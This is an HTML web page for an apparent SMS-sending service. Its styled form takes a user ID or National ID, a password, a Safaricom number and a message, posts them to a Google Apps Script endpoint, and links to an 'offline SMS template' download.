<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Send SMS</title>
  <style>
  /* Reset and base */
  * {
    box-sizing: border-box;
  }

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
  margin: 0;
  min-height: 100vh;
  padding: 20px;

  /* ✅ REMOVE THESE: 
  display: flex;
  justify-content: center;
  */
  
  overflow-y: auto;
  position: relative;
}


  /* Bubble background animation */
  .bubble {
    position: absolute;
    border-radius: 50%;
    opacity: 0.3;
    background: white;
    animation: floatUp 10s infinite ease-in;
  }

  @keyframes floatUp {
    0% {
      transform: translateY(100vh) scale(0.6);
      opacity: 0.3;
    }
    50% {
      opacity: 0.5;
    }
    100% {
      transform: translateY(-10vh) scale(1);
      opacity: 0;
    }
  }

  main {
    background: white;
    max-width: 460px;
    width: 100%;
    border-radius: 12px;
    padding: 30px 25px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
    text-align: center;
    position: relative;
    z-index: 1;
    margin: 0 auto;
  }

  h3 {
    color: #2E7D32;
    font-weight: 700;
    margin-bottom: 25px;
    font-size: 1.8rem;
    letter-spacing: 1px;
  }

  form {
    text-align: left;
  }

  label {
    display: block;
    margin-top: 20px;
    font-weight: 600;
    color: #333;
    font-size: 1rem;
  }

  input[type="text"],
  input[type="password"],
  textarea {
    width: 100%;
    padding: 14px 10px;
    margin-top: 6px;
    border-radius: 8px;
    border: 1.5px solid #ccc;
    font-size: 1.1rem;
    transition: border-color 0.3s ease;
    resize: vertical;
    font-family: inherit;
  }

  input[type="text"]:focus,
  input[type="password"]:focus,
  textarea:focus {
    border-color: #4CAF50;
    box-shadow: 0 0 8px rgba(76, 175, 80, 0.4);
    outline: none;
  }

  textarea {
    min-height: 120px;
    max-height: 180px;
  }

  button {
    margin-top: 30px;
    width: 100%;
    padding: 16px;
    background: #4CAF50;
    border: none;
    border-radius: 8px;
    color: white;
    font-size: 1.2rem;
    font-weight: 600;
    cursor: pointer;
    transition: background-color 0.3s ease;
    letter-spacing: 0.5px;
  }

  button:hover {
    background-color: #388E3C;
  }

  #status {
    margin-top: 20px;
    font-weight: 700;
    font-size: 1rem;
    min-height: 24px;
    user-select: none;
  }

  #status.success {
    color: #2E7D32;
  }

  #status.error {
    color: #D32F2F;
  }

  a.download-link {
    display: inline-block;
    margin-top: 12px;
    width: 100%;
    padding: 14px;
    background-color: #D32F2F;
    color: white;
    text-align: center;
    text-decoration: none;
    border-radius: 8px;
    font-size: 1.05rem;
    font-weight: 600;
    letter-spacing: 0.5px;
    transition: background-color 0.3s ease;
  }

  a.download-link:hover {
    background-color: #B71C1C;
  }

  @media (max-width: 480px) {
    main {
      padding: 24px 18px;
    }

    h3 {
      font-size: 1.5rem;
    }

    label {
      font-size: 1.1rem;
    }

    input[type="text"],
    input[type="password"],
    textarea {
      font-size: 1.2rem;
      padding: 16px;
    }

    button {
      font-size: 1.3rem;
      padding: 18px;
    }

    a.download-link {
      padding: 18px;
      font-size: 1.2rem;
    }
  }
</style>
</head>
<body>
  <!-- Bubble elements -->
  <div class="bubble" style="left:10%; width:40px; height:40px; animation-duration:8s;"></div>
  <div class="bubble" style="left:20%; width:60px; height:60px; animation-duration:10s;"></div>
  <div class="bubble" style="left:35%; width:50px; height:50px; animation-duration:9s;"></div>
  <div class="bubble" style="left:50%; width:70px; height:70px; animation-duration:12s;"></div>
  <div class="bubble" style="left:70%; width:40px; height:40px; animation-duration:7s;"></div>
  <div class="bubble" style="left:85%; width:60px; height:60px; animation-duration:11s;"></div>

  <main>
    <img src="https://i.imgur.com/nZm5UQz.jpeg" alt="Send Bulk SMS Image" style="display: block; max-width: 100%; height: auto; margin: 0 auto;" />
    <h3>SEND SMS TO 1 CONTACT</h3>

    <form id="smsForm">
      <label for="nationalId">National ID OR USER ID:</label>
      <input type="text" id="nationalId" required />

      <label for="password">Password:</label>
      <input type="password" id="password" required />

      <label for="phoneNumber">Phone Number - SAFARICOM:</label>
      <input 
    type="tel" 
    id="phoneNumber" 
    name="phoneNumber" 
    required 
    placeholder="e.g. 0712345678" 
    pattern="^0\d{9}$" 
    title="Enter a 10‑digit phone number starting with 0 (e.g., 0712345678)" 
    oninput="this.value = this.value.replace(/\D/g, '').slice(0,10)" 
    style="width: 200px; padding: 8px; font-size: 16px;"
/>

      <label for="messageText">Message (max 160 characters):</label>
      <textarea id="messageText" maxlength="160" required></textarea>

      <button type="submit">Send SMS</button>

      <a href="https://684fb92f749501033c97fce9--coruscating-lily-fde844.netlify.app/" target="_blank" class="download-link">
        DOWNLOAD OFFLINE SMS TEMPLATE
      </a>
    </form>

    <div id="status"></div>
  </main>

  <script>
    document.getElementById("smsForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const form = document.getElementById("smsForm");
      const nationalId = document.getElementById("nationalId").value.trim();
      const password = document.getElementById("password").value.trim();
      const phoneNumber = document.getElementById("phoneNumber").value.trim();
      const messageText = document.getElementById("messageText").value.trim();
      const statusDiv = document.getElementById("status");

      statusDiv.textContent = "Sending message...";
      statusDiv.className = "";

      fetch("https://script.google.com/macros/s/AKfycbzXN_HhkfpIB5x28kMzBFyC1Er0HFILCMZFt0XEHcWaBf9YkdryKQzNGZvSlak8xf_riA/exec", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({ nationalId, password, phoneNumber, messageText }),
      })
      .then(res => res.json())
      .then(response => {
        if (response.success) {
          statusDiv.textContent = response.msg;
          statusDiv.className = "success";
          form.reset();
        } else {
          statusDiv.textContent = response.msg;
          statusDiv.className = "error";
        }
      })
      .catch(err => {
        statusDiv.textContent = "Error sending request.";
        statusDiv.className = "error";
      });
    });
  </script>
</body>
</html>
